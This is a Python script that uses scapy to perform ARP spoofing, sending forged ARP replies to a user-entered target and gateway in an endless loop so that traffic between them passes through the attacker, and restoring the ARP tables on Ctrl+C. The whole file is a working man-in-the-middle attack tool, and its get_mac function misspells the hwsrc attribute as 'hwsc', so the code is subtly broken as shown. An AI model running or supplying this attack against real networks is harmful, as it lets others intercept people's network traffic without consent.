#!/usr/bin/env python3
import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request 
    answered_list = scapy.srp(arp_request_broadcast, timeout =1, verbose=False )[0]
    return answered_list[0][1].hwsc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    # Get the MAC address of the destination IP
    # This is used to restore the ARP table to its original state
    # The destination IP is the one we want to restore
    source_mac = get_mac(source_ip)
    # Get the MAC address of the source IP
    # This is used to restore the ARP table to its original state   
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)




target_ip = input("Enter the target IP address: ")
gateway_ip = input("Enter the IP address to spoof: ")

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        # Spoof the target IP with the gateway IP
        spoof(gateway_ip, target_ip)
        # Spoof the gateway IP with the target IP
        sent_packets_count += 2
        print("\r[+] Packet sent " + str(sent_packets_count), end="")
        # Print the number of packets sent without a new line
        # This will overwrite the previous line in the console
        # This is useful for keeping the output clean and readable
        time.sleep(2)  # Sleep for 2 seconds to avoid flooding the network
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables.")
    # Handle the keyboard interrupt gracefully
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    # Restore the ARP tables to their original state